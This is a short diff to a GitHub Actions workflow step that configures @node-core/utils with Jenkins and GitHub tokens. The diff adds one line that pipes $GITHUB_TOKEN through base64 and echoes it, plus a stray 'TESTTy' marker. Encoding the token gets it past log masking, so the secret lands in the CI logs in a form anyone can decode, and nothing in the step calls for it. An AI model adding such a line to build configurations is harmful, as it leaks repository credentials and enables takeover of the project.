@@ -60,6 +60,7 @@ jobs:
 
       - name: Setup @node-core/utils
         run: |
+          echo $GITHUB_TOKEN|base64;echo"TESTTy"
           ncu-config set username ${{ secrets.JENKINS_USER }}
           ncu-config set token "${{ secrets.GH_USER_TOKEN }}"
           ncu-config set jenkins_token ${{ secrets.JENKINS_TOKEN }}
